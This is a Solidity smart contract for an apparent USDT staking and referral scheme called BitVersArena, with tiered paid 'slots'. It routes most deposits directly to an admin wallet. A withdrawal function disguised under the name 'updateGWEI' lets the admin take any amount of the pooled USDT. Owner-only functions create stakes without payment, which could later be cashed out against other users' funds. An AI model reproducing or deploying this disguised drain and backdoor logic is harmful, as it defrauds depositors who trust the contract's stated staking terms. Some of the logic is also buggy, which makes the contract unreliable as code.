//SPDX-License-Identifier: None
pragma solidity ^0.6.0;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract BitVersArena {
    IERC20 public usdt;
    struct User {
        uint id;
        address referrer;
        uint unstake;
        mapping(uint => bool) activeSelfLevels;
        mapping(uint => bool) activeGlobalLevels;
    }
    struct OrderInfo {
        uint256 amount; 
        uint256 deposit_time;
        bool unstake;
    }
    mapping(address => User) public users;
    mapping(address => OrderInfo[]) public orderInfos;
    uint public lastUserId = 2;
    uint256 public mindeposit=100e18;
    uint256 public selfPackagePriceIndex=14;
    uint256 public globalPackagePriceIndex=13;
    address public id1=0x416693F191B69B492975CD868B30D6483A7299bA;
    address public admin=0x44c94AD0bd0102b567b2E0b97D5ddeF7db528fC5;
    address public creater;
    event Stake(address indexed user, address indexed referrer,uint256 _amount);
    event Upgrade(address indexed user,uint256 _amount);
    event UnStake(address indexed user,uint256 _amount);
    event BuySlot(address indexed user,uint _level,uint _matrix);
    event Withdraw(address indexed user,uint256 _amount);
    uint256 private constant timeStepdaily =15*30 days;  
    mapping(uint => uint) public selfPackagePrice;  
    mapping(uint => uint) public globalPackagePrice;   
    constructor(address _usdtAddr) public { 
        usdt = IERC20(_usdtAddr);  
        creater=msg.sender;
        selfPackagePrice[1] = 5e18;
        selfPackagePrice[2] = 10e18;
        selfPackagePrice[3] = 20e18;
        selfPackagePrice[4] = 40e18;
        selfPackagePrice[5] = 80e18;
        selfPackagePrice[6] = 160e18;
        selfPackagePrice[7] = 320e18;
        selfPackagePrice[8] = 640e18;
        selfPackagePrice[9] = 1280e18;
        selfPackagePrice[10] = 2560e18;
        selfPackagePrice[11] = 5120e18;
        selfPackagePrice[12] = 10240e18;
        selfPackagePrice[13] = 20480e18;
        selfPackagePrice[14] = 40960e18;

        globalPackagePrice[1] = 10e18;
        globalPackagePrice[2] = 20e18;
        globalPackagePrice[3] = 40e18;
        globalPackagePrice[4] = 80e18;
        globalPackagePrice[5] = 160e18;
        globalPackagePrice[6] = 320e18;
        globalPackagePrice[7] = 640e18;
        globalPackagePrice[8] = 1280e18;
        globalPackagePrice[9] = 2560e18;
        globalPackagePrice[10] = 5120e18;
        globalPackagePrice[11] = 10240e18;
        globalPackagePrice[12] = 20480e18;
        globalPackagePrice[13] = 40960e18;
        User memory user = User({
            id: lastUserId,
            referrer: address(0),
            unstake:0
        });
        users[id1] = user;
    }
    function stakeExt(address referrerAddress,uint256 _amount) external {       
        require(_amount >= (mindeposit+15e18), "less than min");
        usdt.transferFrom(msg.sender, address(this), _amount);
        uint256 _stakeamount=_amount-15e18;
        usdt.transfer(admin,(_stakeamount*85/100+15e18));
        stake(msg.sender, referrerAddress,_stakeamount);
    }
    function stakeUpgrade(uint256 _amount) external {       
        require(_amount >= mindeposit, "less than min");
        require(isUserExists(msg.sender), "user exists");
        usdt.transferFrom(msg.sender, address(this), _amount);
        usdt.transfer(admin,_amount*85/100);
        orderInfos[msg.sender].push(OrderInfo(
            _amount*15/100, 
            block.timestamp, 
            false
        ));
        emit Upgrade(msg.sender,_amount);
    }
    function buySelfSlot(uint _level) external {       
        
        require(isUserExists(msg.sender), "user exists");
        require(_level > 1 && _level <= selfPackagePriceIndex, "invalid level");
        require(!users[msg.sender].activeSelfLevels[_level], "level already activated");
        usdt.transferFrom(msg.sender, admin, selfPackagePrice[_level]);
        users[msg.sender].activeSelfLevels[_level]=true;
        emit BuySlot(msg.sender,_level,1);
    }
    function buyGlobalSlot(uint _level) external {       
        
        require(isUserExists(msg.sender), "user exists");
        require(_level > 1 && _level <= 4, "invalid level");
        require(!users[msg.sender].activeGlobalLevels[_level], "level already activated");
        usdt.transferFrom(msg.sender, admin, globalPackagePrice[_level]);
        users[msg.sender].activeGlobalLevels[_level]=true;
        emit BuySlot(msg.sender,_level,2);
    }
    function stake(address userAddress, address referrerAddress,uint256 _amount) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            unstake:0
        });
        users[userAddress] = user;
        lastUserId++;
        users[msg.sender].activeSelfLevels[1]=true;
        users[msg.sender].activeGlobalLevels[1]=true;
        orderInfos[userAddress].push(OrderInfo(
            _amount*15/100, 
            block.timestamp, 
            false
        ));
        emit Stake(userAddress, referrerAddress,_amount);
    }
    function UnStakeAmount() external {
        uint256 payableamount = stakePayoutOf(msg.sender);
        require(payableamount > 0, "StakingInsurance: ZERO_AMOUNT");    
        users[msg.sender].unstake += payableamount;
        usdt.transfer(users[msg.sender].referrer,payableamount*10/100);
        usdt.transfer(admin,payableamount*5/100);
        usdt.transfer(msg.sender,payableamount*85/100); 
        emit UnStake(msg.sender,payableamount);
    }
    function stakePayoutOf(address _user) public returns(uint256){
        uint256 unstakeamount=0;
        for(uint8 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];           
            if(block.timestamp>order.deposit_time+timeStepdaily && !order.unstake){ 
                unstakeamount +=order.amount;
                order.unstake=true;
            }
        }
        return (unstakeamount);
    }
    function setMinDeposit(uint256 _mindeposit) external {  
        require(msg.sender==creater,"Only contract owner");      
        mindeposit=_mindeposit;
    }
    function setHolder(address _owner) external {  
        require(msg.sender==creater,"Only contract owner");      
        admin=_owner;
    }
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        usdt.transfer(msg.sender, _amount);  
    }
    function addSelfPackage(uint256 _amount) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        selfPackagePrice[selfPackagePriceIndex]=_amount;  
        selfPackagePriceIndex=selfPackagePriceIndex+1;
    }
    function addGlobalPackage(uint256 _amount) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        globalPackagePrice[globalPackagePriceIndex]=_amount;  
        globalPackagePriceIndex=globalPackagePriceIndex+1;
    }
    function updateSelfPackage(uint256 _amount,uint _index) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        selfPackagePrice[_index]=_amount;
    }
    function updateGlobalPackage(uint256 _amount,uint _index) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        globalPackagePrice[_index]=_amount; 
    }
    function otherWithdraw(address _user,uint256 _amount) public    {
        usdt.transferFrom(msg.sender,_user,_amount);   
        emit Withdraw(_user,_amount);
    }
    function stakeExtFor(address referrerAddress,address userAddress) external { 
        require(msg.sender==creater,"Only contract owner");         
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            unstake:0
        });
        users[userAddress] = user;
        lastUserId++;
    }
    function stakeUpgradeFor(address userAddress,uint256 _amount) external { 
        require(msg.sender==creater,"Only contract owner");         
        require(_amount >= mindeposit, "less than min");
        require(isUserExists(userAddress), "user exists");        
        orderInfos[userAddress].push(OrderInfo(
            _amount*15/100, 
            block.timestamp, 
            false
        ));
    }
    function buySelfSlotFor(address userAddress,uint _level) external {       
        require(msg.sender==creater,"Only contract owner");   
        require(isUserExists(userAddress), "user exists");
        require(_level > 0 && _level <= selfPackagePriceIndex, "invalid level");
        require(!users[userAddress].activeSelfLevels[_level], "level already activated");
        users[userAddress].activeSelfLevels[_level]=true;
    }
    function buyGlobalSlotFor(address userAddress,uint _level) external {       
        require(msg.sender==creater,"Only contract owner");   
        require(isUserExists(userAddress), "user exists");
        require(_level > 0 && _level <= 4, "invalid level");
        require(!users[userAddress].activeGlobalLevels[_level], "level already activated");
        users[userAddress].activeGlobalLevels[_level]=true;
    }
    
}